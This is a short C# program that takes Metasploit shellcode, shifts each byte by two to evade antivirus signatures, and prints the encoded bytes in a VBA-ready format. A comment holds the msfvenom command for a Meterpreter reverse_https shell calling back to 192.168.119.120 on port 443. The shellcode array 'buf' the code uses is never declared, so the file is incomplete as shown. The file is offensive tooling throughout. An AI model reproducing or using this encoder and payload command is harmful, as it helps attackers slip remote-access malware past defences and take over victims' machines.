using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

namespace inject
{
    class Program
    {

     
        static void Main(string[] args)
        {
        	//msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f csharp
        	
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
              encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }
            uint counter = 0;
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach(byte b in encoded)
            {
              hex.AppendFormat("{0:D}, ", b);
              counter++;
              if(counter % 50 == 0)
              {
                hex.AppendFormat("_{0}", Environment.NewLine);
              }
            }
            Console.WriteLine("The payload is: " + hex.ToString());
            Console.ReadLine();
        }
    }
}
